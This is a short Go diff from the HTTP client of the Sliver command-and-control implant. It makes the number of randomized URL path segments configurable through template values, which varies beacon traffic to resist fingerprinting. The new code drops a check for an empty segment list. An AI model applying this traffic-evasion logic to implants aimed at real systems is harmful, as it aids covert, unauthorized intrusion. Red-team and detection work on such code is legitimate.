@@ -651,12 +651,12 @@ func (s *SliverHTTPClient) startSessionURL() *url.URL {
 // Must return at least a file name, path segments are optional
 func (s *SliverHTTPClient) randomPath(segments []string, filenames []string, ext string) []string {
 	genSegments := []string{}
-	if 0 < len(segments) {
-		n := insecureRand.Intn(len(segments)) // How many segments?
-		for index := 0; index < n; index++ {
-			seg := segments[insecureRand.Intn(len(segments))]
-			genSegments = append(genSegments, seg)
-		}
+	min, _ := strconv.Atoi("{{.HTTPC2ImplantConfig.MinPaths}}")
+	max, _ := strconv.Atoi("{{.HTTPC2ImplantConfig.MaxPaths}}")
+	n := insecureRand.Intn(max-min+1) + min // How many segments?
+	for index := 0; index < n; index++ {
+		seg := segments[insecureRand.Intn(len(segments))]
+		genSegments = append(genSegments, seg)
 	}
 	filename := filenames[insecureRand.Intn(len(filenames))]
 
